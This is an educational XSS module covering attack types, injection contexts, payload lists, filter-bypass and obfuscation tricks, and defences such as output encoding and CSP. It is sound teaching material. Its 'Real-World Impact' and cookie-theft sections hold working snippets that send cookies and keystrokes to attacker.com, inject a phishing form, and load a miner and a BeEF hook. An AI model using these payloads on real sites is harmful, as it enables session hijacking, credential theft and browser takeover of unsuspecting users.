# Cross-Site Scripting (XSS) Fundamentals

## 1. Orientation

### What this module covers
This module covers Cross-Site Scripting (XSS)—executing malicious JavaScript in another user's browser. XSS is consistently among the most prevalent web vulnerabilities and provides attackers with powerful client-side control.

### Fit in the Learning Path
XSS is the most common web vulnerability class. Understanding XSS is essential—it enables session hijacking, credential theft, phishing within trusted contexts, and client-side attacks that bypass server-side controls.

### Learning Objectives
By the end of this module, you will:
*   Understand XSS types and their implications
*   Apply different payload techniques and bypass methods
*   Recognize real-world impact beyond `alert(1)`
*   Identify and mitigate XSS vulnerabilities

---

## 2. Core Content

### Mental Model: Output Becomes Code

**How professionals think about this:**
XSS occurs when user-controlled data is inserted into a page's HTML without proper encoding, allowing the attacker's input to be interpreted as executable code by the victim's browser.

```
XSS MECHANISM:

VULNERABLE APPLICATION:
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  1. Attacker input: <script>evil()</script>                         │
│                    │                                                │
│                    ▼                                                │
│  2. Server stores/reflects: "Hello <script>evil()</script>"         │
│                    │                                                │
│                    ▼                                                │
│  3. Server sends HTML to victim's browser:                          │
│     <html>                                                         │
│       <body>                                                       │
│         Hello <script>evil()</script>                              │
│       </body>                          └────────────────────────┐   │
│     </html>                                                     │   │
│                                                                 │   │
│  4. Victim's browser parses HTML, executes script ◄─────────────┘   │
│                    │                                                │
│                    ▼                                                │
│  5. Attacker's code runs as victim (same origin)                   │
│     - Access cookies                                               │
│     - Read page content                                            │
│     - Make requests as victim                                      │
│     - Modify page display                                          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

KEY INSIGHT: The browser cannot distinguish between legitimate
             page code and injected attacker code
```

### XSS Types

**Three primary categories:**

```
XSS TYPE COMPARISON:

REFLECTED XSS:
─────────────────
Attacker → Crafts malicious URL
         → Tricks victim into clicking
         → Server reflects payload in response
         → Victim's browser executes

Example:
https://site.com/search?q=<script>alert(1)</script>

Characteristics:
- Requires victim interaction (clicking link)
- One-time execution per click
- Payload visible in URL (can use encoding)


STORED (PERSISTENT) XSS:
─────────────────
Attacker → Submits payload (comment, profile, etc.)
         → Server stores in database
         → Victim views page containing payload
         → Victim's browser executes

Example:
Comment: "Great post! <script>steal(document.cookie)</script>"

Characteristics:
- No victim interaction beyond normal browsing
- Affects all users who view the content
- More impactful, harder to detect


DOM-BASED XSS:
─────────────────
Attacker → Crafts malicious URL
         → Victim visits page
         → Client-side JavaScript processes URL unsafely
         → Script executes (never sent to server)

Example:
https://site.com/page#<script>alert(1)</script>
// Page JS: document.write(location.hash)

Characteristics:
- Payload may never reach server (in fragment)
- Server logs may not show attack
- Requires vulnerable client-side code
```

### HTML Injection Contexts

**Where your input lands matters:**

```
INJECTION CONTEXTS:

1. HTML BODY CONTEXT
   <p>Hello USER_INPUT</p>
   Payload: <script>alert(1)</script>
   
2. HTML ATTRIBUTE CONTEXT
   <input value="USER_INPUT">
   Payload: " onmouseover="alert(1)
   Result: <input value="" onmouseover="alert(1)">

3. JAVASCRIPT CONTEXT
   <script>var x = "USER_INPUT";</script>
   Payload: ";alert(1)//
   Result: <script>var x = "";alert(1)//";</script>

4. URL CONTEXT
   <a href="USER_INPUT">
   Payload: javascript:alert(1)
   Result: <a href="javascript:alert(1)">

5. CSS CONTEXT
   <style>body{background:USER_INPUT}</style>
   Payload: red;}</style><script>alert(1)</script>

EACH CONTEXT REQUIRES DIFFERENT PAYLOADS
```

### Common XSS Payloads

**Basic payloads:**

```html
<!-- Standard script tag -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

<!-- Pseudo-protocols -->
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">

<!-- Data URI -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- Template injection -->
<template><script>alert(1)</script></template>
```

### Filter Bypass Techniques

**Common bypasses:**

| Filter | Bypass Technique |
|--------|-----------------|
| `<script>` blocked | Use `<img onerror=...>`, `<svg onload=...>` |
| Case-sensitive | `<ScRiPt>`, `<SCRIPT>` |
| Keyword blocked | `<scr<script>ipt>` (nested) |
| Parentheses blocked | `alert`1`` (template literals) |
| Quotes blocked | `String.fromCharCode(88,83,83)` |
| Event handlers blocked | `<svg/onload=alert(1)>` (no space) |
| HTML entities | `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` |

**Advanced bypasses:**

```html
<!-- Without parentheses -->
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw+1>

<!-- Without quotes -->
<img src=x onerror=alert(/XSS/)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- Without angle brackets (in attributes) -->
" onfocus=alert(1) autofocus="

<!-- Obfuscation -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:>
```

### Real-World Impact

**Beyond `alert(1)`:**

```javascript
// Session hijacking
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

// Keylogging
<script>
document.onkeypress=function(e){
  new Image().src="http://attacker.com/log?k="+e.key;
};
</script>

// Credential phishing
<script>
document.body.innerHTML='<form action="http://attacker.com/phish">'+
'<input name="user" placeholder="Session expired, please login">'+
'<input name="pass" type="password">'+
'<button>Login</button></form>';
</script>

// DOM manipulation (deface)
<script>
document.body.innerHTML="<h1>HACKED</h1>";
</script>

// Cryptocurrency mining
<script src="http://attacker.com/miner.js"></script>

// BeEF hook (full browser control)
<script src="http://attacker.com:3000/hook.js"></script>
```

### Cookie Theft

**Stealing sessions:**

```
COOKIE THEFT FLOW:

1. Attacker injects XSS payload:
   <script>
   fetch('https://attacker.com/steal?c='+document.cookie);
   </script>

2. Victim visits page, XSS executes

3. Victim's browser sends cookies to attacker:
   GET /steal?c=session=abc123;auth=xyz789

4. Attacker captures cookies in server logs

5. Attacker replays session cookie:
   curl -H "Cookie: session=abc123" https://target.com/dashboard
   
   → Attacker is now logged in as victim

DEFENSE: HttpOnly cookies (blocks document.cookie access)
BYPASS: XSS can still make authenticated requests
```

### DOM-Based XSS

**Client-side vulnerabilities:**

```javascript
// Vulnerable sinks (where data is used dangerously)
document.write(userInput);
element.innerHTML = userInput;
element.outerHTML = userInput;
eval(userInput);
setTimeout(userInput);
setInterval(userInput);
new Function(userInput);
location = userInput;

// Vulnerable sources (where attacker input comes from)
location.hash
location.search
location.href
document.URL
document.referrer
window.name
localStorage/sessionStorage

// Example vulnerable code:
var hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;

// Attack:
https://site.com/page#<img src=x onerror=alert(1)>
```

### XSS Prevention

**Defense strategies:**

```
XSS PREVENTION LAYERS:

1. OUTPUT ENCODING (Primary)
   ─────────────────────────
   Context-specific encoding:
   - HTML: < → &lt;
   - Attribute: " → &quot;
   - JavaScript: ' → \'
   - URL: < → %3C

2. CONTENT SECURITY POLICY (CSP)
   ─────────────────────────
   Content-Security-Policy: default-src 'self';
                           script-src 'self' https://cdn.com;
   
   Blocks inline scripts and unauthorized external scripts

3. HTTPONLY COOKIES
   ─────────────────────────
   Set-Cookie: session=abc; HttpOnly
   
   Prevents document.cookie access (but not authenticated requests)

4. INPUT VALIDATION
   ─────────────────────────
   Reject unexpected input formats
   Not sufficient alone—defense in depth

5. SANITIZATION LIBRARIES
   ─────────────────────────
   DOMPurify, Bleach, sanitize-html
   Strip dangerous tags/attributes
```

---

## 3. Guided Practice

### Exercise 1: Context Identification

For each scenario, identify the context and craft a payload:

| Server Output | Context | Payload |
|---------------|---------|---------|
| `<div>Hello USER</div>` | ___ | ___ |
| `<input value="USER">` | ___ | ___ |
| `<script>var x="USER"</script>` | ___ | ___ |
| `<a href="USER">click</a>` | ___ | ___ |

### Exercise 2: Bypass Crafting

The WAF blocks `<script>`. Craft 3 alternative payloads:

1. ___
2. ___
3. ___

### Exercise 3: Impact Assessment

You found stored XSS in:
1. User profile "About me" field
2. Product review comments
3. Admin dashboard message

Rate each by impact (High/Medium/Low) and explain:

| Location | Impact | Reason |
|----------|--------|--------|
| Profile | ___ | ___ |
| Reviews | ___ | ___ |
| Admin dashboard | ___ | ___ |

---

## 4. Reflection Check

### Understanding XSS
1. Why is stored XSS generally more serious than reflected XSS?

2. HttpOnly is set on session cookies. Is XSS still impactful? How?

3. CSP blocks inline scripts. How might you still achieve XSS?

### Attack Thinking
1. You want to steal sensitive data from a page. The page has no cookies. What's your XSS strategy?

2. The only input is a number field. How might you test for XSS?

3. You found DOM XSS in `innerHTML`. The payload is in `location.hash`. Will this appear in server logs?

---

## 5. Key Misconceptions

**MYTH: "`alert(1)` is just a harmless popup"**
REALITY: `alert(1)` proves arbitrary JavaScript execution. Real attacks steal sessions, credentials, and control browsers.

**MYTH: "HttpOnly cookies fully protect against XSS"**
REALITY: HttpOnly prevents cookie theft, but XSS can still make authenticated requests, modify page content, and phish credentials.

**MYTH: "WAFs prevent XSS"**
REALITY: WAFs catch known patterns. Many bypasses exist. Output encoding is the real solution.

**MYTH: "Input validation prevents XSS"**
REALITY: Input validation helps but can't anticipate all contexts. Output encoding based on context is required.

**MYTH: "Modern frameworks are automatically safe"**
REALITY: Frameworks help but developers can bypass protections (innerHTML, dangerouslySetInnerHTML, etc.).

---

## 6. Completion Criteria

This module is complete when you can:

1. **Distinguish** between reflected, stored, and DOM XSS
2. **Identify** injection contexts and appropriate payloads
3. **Apply** filter bypass techniques
4. **Explain** real-world XSS impact beyond `alert(1)`
5. **Describe** defense mechanisms and their limitations

---

## 7. Further Depth (Optional)

*   **Practice:** PortSwigger XSS labs, DVWA
*   **Tool:** BeEF framework for browser exploitation
*   **Payloads:** Study PayloadsAllTheThings XSS section
*   **Research:** CSP bypass techniques, Mutation XSS
